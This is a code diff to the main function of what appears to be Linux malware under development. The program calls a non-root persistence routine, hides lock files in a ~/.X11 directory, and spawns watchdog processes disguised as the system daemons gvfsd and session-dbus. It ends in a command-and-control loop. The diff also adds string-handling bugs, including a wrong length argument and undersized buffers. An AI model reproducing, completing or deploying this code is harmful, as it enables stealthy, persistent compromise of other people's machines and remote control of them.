@@ -15,7 +15,6 @@ int main(int argc, char *argv[]) {
     printf("DEBUG MODE ENABLED\n");
     #endif
 
-    pid_t id = getuid();
 
     bool desktop_res = nonroot_persistence();
     if (desktop_res == false ) {
@@ -25,23 +24,24 @@ int main(int argc, char *argv[]) {
     //if session-dbus lock file is locked... creat the lock for gvfsd and spawn gvfsd
     char *home = getenv("HOME");
     char *lock_path = "/.X11/.X11-lock";
+    char *lock_path_2 = "/.X11/.X0-lock";
     char *home_lock_path = (char *)malloc(strlen(home) + strlen(lock_path));
+    char *home_lock_path_2 = (char *)malloc(strlen(home) + strlen(lock_path_2));
 
     memcpy(home_lock_path, home, strlen(home));
-    //strncat(home_lock_path, lock_path, stlen(lock_path))
+    memcpy(home_lock_path_2, home, strlen(home));
 
-    if (lock_check("/home/gdev/.X11/.X11-lock") != 0) {
+    strncat(home_lock_path, lock_path, strlen(lock_path));
+    strncat(home_lock_path_2, lock_path, strlen(lock_path_2));
 
-        create_lock(1);  // lock file created, when gvfspd spawns session-dbus, the top loop will run forever.
+    //ex: lock_check("/home/gdev/.X11/.X11-lock")
+    if (lock_check(home_lock_path) != 0) {
 
-        if (id != 0 ) { // non-root
-           // daemon(0, 0);
-           // spawn gvfsd-helper
-            spawn_thread_watchdog(1);
-        }
+        create_lock(0);  // lock file created, when gvfspd spawns session-dbus, the top loop will run forever.
+        spawn_thread_watchdog(0);
 
         do {
-        // forever run session-dbus as a "watchdog process".
+            // forever run session-dbus as a "watchdog process".
             sleep(10);
         }while(true);
 
@@ -50,9 +50,9 @@ int main(int argc, char *argv[]) {
         // spawns -> /home/$USER/.gvfsd/.profile/gvfsd-helper
 
      // creating .X11/X0-lock
-    create_lock(0);
+    create_lock(1);
         //session-dbus create
-    spawn_thread_watchdog(0);
+    spawn_thread_watchdog(1);
         // Main C2 goes here?
     c2_loop();
 
